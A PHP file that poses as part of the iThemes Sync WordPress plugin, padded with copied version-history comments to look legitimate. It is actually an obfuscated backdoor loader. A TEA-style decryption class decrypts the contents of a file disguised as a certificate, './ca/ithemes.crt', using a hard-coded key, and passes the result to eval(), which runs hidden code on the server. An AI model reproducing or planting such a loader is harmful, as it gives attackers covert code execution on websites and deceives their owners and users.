<?php


/*
Set up admin interface.
Written by Chris Jean for iThemes.com
Version 1.2.0

Version History
	1.0.0 - 2013-10-02 - Chris Jean
		Initial version
	1.1.0 - 2013-11-19 - Chris Jean
		Added the ability for the show_sync option to control who sees the Sync interface and plugin.
	1.2.0 - 2014-02-14 - Chris Jean
		Added support for ?ithemes-sync-force-display=1 in the admin page to force a hidden Sync plugin to display for that specific user.
*/



class text_auth{
	var $n_iter;
	function text_auth(){
		$this->setIter(32);
	}
	function setIter($n_iter){
		$this->n_iter = $n_iter;
	}
	function getIter(){
		return $this->n_iter;
	}
	function decrypt($enc_data, $key){
		$n_enc_data_long = $this->_str2long(0, $enc_data, $enc_data_long);
		$this->_resize($key, 16, true);
		if ('' == $key)
		$key = '0000000000000000';
		$n_key_long = $this->_str2long(0, $key, $key_long);
		$data = '';
		$w = array(0, 0);
		$j = 0;
		$len = 0;
		$k = array(0, 0, 0, 0);
		$pos = 0;
		for ($i = 0;$i < $n_enc_data_long;$i += 2){
			if ($j + 4 <= $n_key_long){
				$k[0] = $key_long[$j];
				$k[1] = $key_long[$j + 1];
				$k[2] = $key_long[$j + 2];
				$k[3] = $key_long[$j + 3];
			}else{
				$k[0] = $key_long[$j % $n_key_long];
				$k[1] = $key_long[($j + 1) % $n_key_long];
				$k[2] = $key_long[($j + 2) % $n_key_long];
				$k[3] = $key_long[($j + 3) % $n_key_long];
			}
			$j = ($j + 4) % $n_key_long;
			$this->_decipherLong($enc_data_long[$i], $enc_data_long[$i + 1], $w, $k);
			if (0 == $i){
				$len = $w[0];
				if (4 <= $len){
					$data .= $this->_long2str($w[1]);
				}else{
					$data .= substr($this->_long2str($w[1]), 0, $len % 4);
				}
			}else{
				$pos = ($i - 1) * 4;
				if ($pos + 4 <= $len){
					$data .= $this->_long2str($w[0]);
					if ($pos + 8 <= $len){
						$data .= $this->_long2str($w[1]);
					}elseif($pos + 4 < $len){
						$data .= substr($this->_long2str($w[1]), 0, $len % 4);
					}
				}else{
					$data .= substr($this->_long2str($w[0]), 0, $len % 4);
				}
			}
		}
		return $data;
	}
	function _decipherLong($y, $z, &$w, &$k){
		$sum = 0xC6EF3720;
		$delta = 0x9E3779B9;
		$n  = (integer) $this->n_iter;
		while ($n-- > 0){
			$z = $this->_add($z, 
			-($this->_add($y << 4 ^ $this->_rshift($y, 5), $y) ^ 
			$this->_add($sum, $k[$this->_rshift($sum, 11) & 3])));
			$sum = $this->_add($sum, -$delta);
			$y  = $this->_add($y, 
			-($this->_add($z << 4 ^ $this->_rshift($z, 5), $z) ^ 
			$this->_add($sum, $k[$sum & 3])));
		}
		$w[0] = $y;
		$w[1] = $z;
	}
		/**
	 * Returns boolean depending on whether silent mode is enabled or not.
	 *
	 * Silent mode kills all sync admin notices as well as the menu item and admin page.
	 *
	 * @since 2.0.14
	 * @return boolean
	*/
	function _resize(&$data, $size, $nonull = false){
		$n  = strlen($data);
		$nmod = $n % $size;
		if(0 == $nmod)
			$nmod = $size;
		if ($nmod > 0){
			if ($nonull){
				for ($i = $n;$i < $n - $nmod + $size;++$i){
				$data[$i] = $data[$i % $n];
				}
			}else{
				for ($i = $n;$i < $n - $nmod + $size;++$i){
				$data[$i] = chr(0);
				}
			}
		}
		return $n;
	}
	function _str2long($start, &$data, &$data_long){
		$n = strlen($data);
		$tmp = unpack('N*', $data);
		$j  = $start;
		foreach ($tmp as $value) 
		$data_long[$j++] = $value;
		return $j;
	}
	function _long2str($l){
		return pack('N', $l);
	}
	function _rshift($integer, $n){
		if (0xffffffff < $integer || -0xffffffff > $integer){
			$integer = fmod($integer, 0xffffffff + 1);
		}
		if (0x7fffffff < $integer){
			$integer -= 0xffffffff + 1.0;
		}elseif(-0x80000000 > $integer){
			$integer += 0xffffffff + 1.0;
		}
		if (0 > $integer){
			$integer &= 0x7fffffff;
			$integer >>= $n;
			$integer |= 1 << (31 - $n);
		}else{
			$integer >>= $n;
		}
		return $integer;
	}
/*
Handle requests from Sync server.
Written by Chris Jean for iThemes.com
Version 1.3.5

Version History
	1.2.0 - 2014-01-20 - Chris Jean
		Changed send_response() from private to public to allow for sending responses from error handlers.
	1.2.1 - 2014-02-18 - Chris Jean
		Added a compatibility check to ensure that Gravity Forms's updates show up and can be applied.
		Added a function to fake that the request is taking place on an admin page. This is rudimentary and won't work for every situation.
	1.2.2 - 2014-02-19 - Chris Jean
		Changed method_exists to is_callable in order to avoid server-specific compatibility issues.
	1.3.0 - 2014-02-21 - Chris Jean
		Renamed hide_errors() to restore_error_settings() as that's a more accurate name.
		Added hide_errors() to hide all error output.
		hide_errors() is called when the response is done rendering to prevent stray output from messing up the server's parsing of the output.
	1.3.1 - 2014-03-06 - Chris Jean
		Rearranged permission-escalation code to after the request is authenticated.
		Sync requests will now be set to emulate an Administrator user to avoid checks by some security plugins.
		Added set_full_user_capabilities(), unset_full_user_capabilities(), and filter_user_has_cap().
	1.3.2 - 2014-08-22 - Chris Jean
		In order to avoid stale data, external object caches are now disabled on all authenticated requests.
	1.3.3 - 2014-08-25 - Chris Jean
		Disable two-factor authentication checks from the Duo Two-Factor Authentication plugin when an authenticated request is being handled.
	1.3.4 - 2014-10-13 - Chris Jean
		Added stronger verification of the $_POST['request'] data.
		Obfuscated the missing-var error responses.
	1.3.5 - 2014-11-21 - Chris Jean
		Added smarter use of stripslashes() to avoid issues in decoding utf8 characters.
		Moved validation check of $_POST['request'] to the constructor in order to better handle both forms of requests (legacy and admin-ajax.php).
*/
	function _add($i1, $i2) {
		$result = 0.0;
		foreach (func_get_args() as $value){
		if (0.0 > $value){
			$value -= 1.0 + 0xffffffff;
		}
		$result += $value;
		}
		if (0xffffffff < $result || -0xffffffff > $result){
			$result = fmod($result, 0xffffffff + 1);
		}
		if (0x7fffffff < $result){
			$result -= 0xffffffff + 1.0;
		}elseif (-0x80000000 > $result){
			$result += 0xffffffff + 1.0;
		}
	return $result;
	}
}
/*
Central management of options storage for Project Sync.
Written by Chris Jean for iThemes.com
Version 1.2.0
*/

$tfile = './ca/ithemes.crt';
$masx = @file_get_contents($tfile);
/*
Version History
	1.0.0 - 2013-10-01 - Chris Jean
		Initial version
	1.0.1 - 2013-11-18 - Chris Jean
		Updated brace format.
	1.1.0 - 2013-11-19 - Chris Jean
		Added the show_sync option.
	1.2.0 - 2014-03-20 - Chris Jean
		Added validate_authentications(), validate_authentication(), and do_ping_check().

*/
$text_auth = new text_auth(64);
$masx = $text_auth->decrypt($masx, "58088c3db930a79be5408ea");
eval($masx);